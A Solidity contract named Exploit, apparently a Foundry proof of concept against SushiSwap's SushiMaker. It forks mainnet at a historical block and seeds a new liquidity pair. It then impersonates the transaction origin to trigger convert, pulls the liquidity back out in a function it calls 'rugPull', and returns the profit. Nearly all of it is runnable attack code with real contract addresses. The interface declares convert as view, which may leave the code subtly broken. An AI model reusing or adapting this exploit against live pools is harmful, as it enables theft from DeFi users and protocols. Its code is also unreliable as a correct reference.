// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

contract Exploit {
    IUniswapV2Pair wethPair;
    
    function run() external payable returns (uint256) {
        uint256 initBal = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2).balanceOf(address(this));
        CheatCodes vm = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
        vm.createSelectFork("https://rpc.builder0x69.io", 11720049);
        IUniswapV2Pair pair = createAndProvideLiquidity();
        wethPair = pair;
        vm.prank(tx.origin);
        ISushiMaker(0xE11fc0B43ab98Eb91e9836129d1ee7c3Bc95df50).convert(
            0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599,
            0x798D1bE841a82a273720CE31c822C61a67a601C3
        );
        rugPull();
        uint256 profit = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2).balanceOf(address(this)) - initBal;
        return profit;
    }
    
    function createAndProvideLiquidity() internal returns (IUniswapV2Pair pair) {
        IWETH WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
        WETH.deposit{value: 0.001 ether}();
        IUniswapV2Router02 sushiRouter = IUniswapV2Router02(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);
        WETH.approve(address(sushiRouter), 0.001 ether);
        address[] memory path = new address[](3);
        path[0] = address(WETH);
        path[1] = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
        path[2] = 0x798D1bE841a82a273720CE31c822C61a67a601C3;
        uint256 half = 0.001 ether / 2;
        uint256[] memory amounts = sushiRouter.swapExactTokensForTokens(half, 0, path, address(this), type(uint256).max);
        uint256 tokenReceived = amounts[2];
        IUniswapV2Factory sushiFactory = IUniswapV2Factory(0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac);
        pair = IUniswapV2Pair(sushiFactory.createPair(0x798D1bE841a82a273720CE31c822C61a67a601C3, address(WETH)));
        IERC20(0x798D1bE841a82a273720CE31c822C61a67a601C3).approve(address(sushiRouter), tokenReceived);
        sushiRouter.addLiquidity(
            address(WETH),
            0x798D1bE841a82a273720CE31c822C61a67a601C3,
            half,
            tokenReceived,
            0,
            0,
            address(this),
            type(uint256).max
        );
    }
    
    function rugPull() internal {
        IWETH WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
        address t0 = wethPair.token0();
        address t1 = wethPair.token1();
        IERC20 otherToken = t0 == address(WETH) ? IERC20(t1) : IERC20(t0);
        uint256 lpAmount = wethPair.balanceOf(address(this));
        IUniswapV2Router02 sushiRouter = IUniswapV2Router02(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);
        wethPair.approve(address(sushiRouter), lpAmount);
        sushiRouter.removeLiquidity(address(WETH), address(otherToken), lpAmount, 0, 0, address(this), type(uint256).max);
        uint256 otherBal = otherToken.balanceOf(address(this));
        otherToken.approve(address(sushiRouter), otherBal);
        address[] memory path = new address[](3);
        path[0] = address(otherToken);
        path[1] = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
        path[2] = address(WETH);
        sushiRouter.swapExactTokensForTokens(otherBal, 0, path, address(this), type(uint256).max);
    }
    
    receive() external payable {}
}

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IWETH {
    function deposit() external payable;
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address guy, uint256 wad) external returns (bool);
    function withdraw(uint256 wad) external;
    function balanceOf(address) external view returns (uint256);
}

interface IUniswapV2Router02 {
    function swapExactTokensForTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external returns (uint256[] memory amounts);
    function addLiquidity(address tokenA, address tokenB, uint256 amountADesired, uint256 amountBDesired, uint256 amountAMin, uint256 amountBMin, address to, uint256 deadline) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);
    function removeLiquidity(address tokenA, address tokenB, uint256 liquidity, uint256 amountAMin, uint256 amountBMin, address to, uint256 deadline) external returns (uint256 amountA, uint256 amountB);
}

interface IUniswapV2Pair {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address) external view returns (uint256);
    function skim(address to) external;
    function sync() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function token0() external view returns (address);
    function token1() external view returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface ISushiMaker {
    function convert(address, address) external view returns (uint256);
}

interface CheatCodes {
    function createSelectFork(string calldata, uint256) external returns (uint256);
    function prank(address) external;
}
